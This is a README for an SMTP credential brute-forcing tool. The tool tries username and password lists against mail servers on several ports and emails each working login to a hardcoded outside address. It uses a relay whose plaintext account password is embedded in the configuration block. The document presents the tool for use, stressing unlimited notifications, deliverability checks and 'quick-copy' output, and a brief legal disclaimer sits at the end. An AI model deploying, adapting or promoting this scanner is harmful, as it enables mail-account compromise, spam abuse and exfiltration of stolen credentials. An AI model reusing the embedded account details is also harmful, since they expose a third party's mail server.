# SMTP Scanner v2.0 - Enhanced Email Notification Version

A powerful, multi-threaded SMTP authentication scanner that tests SMTP servers on multiple ports and automatically sends all working authenticated SMTP credentials immediately to your email address.

## Features

- **Multi-port scanning**: Tests ports 25, 465, 587, and 2525
- **Multi-threaded**: Configurable thread count for fast scanning
- **Immediate email notifications**: Sends each working SMTP credential instantly to ajayferobrake@mail.com
- **Deliverability testing**: Only notifies about SMTPs that can actually send emails
- **Multiple output formats**: TXT, CSV, and JSON formats
- **Real-time progress updates**: Shows scan progress and found credentials
- **Throttling control**: Configurable delay between attempts
- **Comprehensive logging**: Detailed logs for debugging and analysis
- **SSL/TLS support**: Handles different encryption methods automatically
- **Error handling**: Robust error handling and timeout management

## Installation

No additional packages required beyond Python 3 standard library.

```bash
# Make script executable
chmod +x smtp_scanner.py
```

## Quick Start

1. **Initialize the scanner** (creates sample files):
```bash
python3 smtp_scanner.py a
```

2. **Add target IPs** to `ips.txt`:
```
192.168.1.100
mail.example.com
smtp.company.com
```

3. **Run the scanner**:
```bash
python3 smtp_scanner.py 10 1 1
```

**Email Configuration**: The scanner is pre-configured to send working SMTP credentials to `ajayferobrake@mail.com` using the `mail.globalhouse.co.th` SMTP server.

## Usage

```bash
python3 smtp_scanner.py <threads> [verbose] [debug]
python3 smtp_scanner.py a  # Create sample files and config
```

### Parameters:
- `<threads>`: Number of worker threads (1-100)
- `[verbose]`: Set to 1 for verbose output, 0 for quiet
- `[debug]`: Set to 1 for debug output, 0 for no debug

### Examples:
```bash
# 10 threads, verbose, with debug
python3 smtp_scanner.py 10 1 1

# 20 threads, quiet mode
python3 smtp_scanner.py 20 0 0

# Create sample files and configuration
python3 smtp_scanner.py a
```

## Configuration

### Email Configuration (Hardcoded)
The scanner is pre-configured with the following email settings:

```python
# --- SMTP CONFIGURATION (EDIT THESE or set environment variables) ---
SMTP_SERVER = os.getenv('SMTP_SERVER', "mail.globalhouse.co.th")
SMTP_PORT = int(os.getenv('SMTP_PORT', "587"))
SMTP_USER = os.getenv('SMTP_USER', "tp@globalhouse.co.th")
SMTP_PASS = os.getenv('SMTP_PASS', "Globalhouse@123")
NOTIFY_EMAIL = os.getenv('NOTIFY_EMAIL', "ajayferobrake@mail.com")

# --- NOTIFICATION SETTINGS ---
MIN_NOTIFICATION_INTERVAL = 300  # 5 mins between notifications per host
MAX_NOTIFICATIONS_PER_HOUR = 10 ** 9  # effectively unlimited notifications
ONLY_NOTIFY_DELIVERABLE_SMTP = True
THROTTLE_DELAY_SECONDS = 0.1  # Throttle delay between attempts per thread
```

### Input Files

- **ips.txt**: Target IP addresses or hostnames (one per line)
- **users.txt**: Usernames to test (one per line)
- **pass.txt**: Passwords to test (one per line)

## Email Configuration Examples

### Gmail Configuration:
```json
{
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "email": "your_email@gmail.com",
    "password": "your_app_password",
    "recipient": "receiver@gmail.com",
    "use_ssl": false
}
```

### Outlook/Hotmail Configuration:
```json
{
    "smtp_server": "smtp-mail.outlook.com",
    "smtp_port": 587,
    "email": "your_email@outlook.com",
    "password": "your_password",
    "recipient": "receiver@outlook.com",
    "use_ssl": false
}
```

### Yahoo Configuration:
```json
{
    "smtp_server": "smtp.mail.yahoo.com",
    "smtp_port": 587,
    "email": "your_email@yahoo.com",
    "password": "your_app_password",
    "recipient": "receiver@yahoo.com",
    "use_ssl": false
}
```

## Output Files

The scanner creates multiple output files:

1. **working_smtps.txt**: Simple format for easy parsing
   ```
   admin:password@192.168.1.100:587
   user:123456@mail.example.com:465
   ```

2. **working_smtps.csv**: CSV format for spreadsheet import
   ```csv
   Host,Port,Username,Password,Connection_Type,Timestamp,Welcome_Message
   "192.168.1.100",587,"admin","password","TLS","2024-01-15 14:30:25","220 mail.example.com ESMTP"
   ```

3. **working_smtps_detailed.json**: Detailed JSON format with all information
   ```json
   {"host": "192.168.1.100", "port": 587, "username": "admin", "password": "password", "welcome": "220 mail.example.com ESMTP", "features": "250-AUTH LOGIN PLAIN", "timestamp": "2024-01-15 14:30:25", "connection_type": "TLS"}
   ```

4. **smtp_scanner.log**: Detailed scan log for debugging

## Email Notifications

The scanner sends two types of email notifications:

### 1. Progress Updates (Every 5 Working SMTPs Found)
- Quick notification with latest finds
- Sent automatically during scanning
- Shows current progress and recent discoveries

### 2. Final Results (When Scan Completes)
- Comprehensive report with all working SMTPs
- Includes scan statistics and timing
- Attaches all result files
- Contains quick-copy format for easy use

## Security Notes

- **Use responsibly**: Only scan systems you own or have explicit permission to test
- **App passwords**: Use app-specific passwords for Gmail and other providers
- **Secure storage**: Keep configuration files secure and don't commit them to version control
- **Network security**: Be aware that scanning may trigger security alerts

## Troubleshooting

### Common Issues:

1. **Email sending fails**:
   - Check SMTP server settings
   - Verify credentials
   - Enable "Less secure app access" or use app passwords
   - Check firewall/network restrictions

2. **No working SMTPs found**:
   - Verify target hosts are reachable
   - Check if ports are open
   - Ensure username/password combinations are valid
   - Review firewall settings

3. **Slow scanning**:
   - Increase thread count (but not too high)
   - Check network latency
   - Verify targets are responsive

4. **Permission errors**:
   - Ensure script has write permissions
   - Check file system permissions

### Debug Mode:
Run with debug enabled to see detailed error messages:
```bash
python3 smtp_scanner.py 10 1 1
```

## Legal Disclaimer

This tool is intended for legitimate security testing and educational purposes only. Users are responsible for ensuring they have proper authorization before scanning any systems. Unauthorized access to computer systems is illegal in many jurisdictions.

## Version History

- **v2.0**: Enhanced email notification system, multiple output formats, improved error handling
- **v1.0**: Basic SMTP authentication scanner

## Support

For issues or questions, review the log files and ensure proper configuration. The scanner includes comprehensive error handling and logging to help diagnose problems.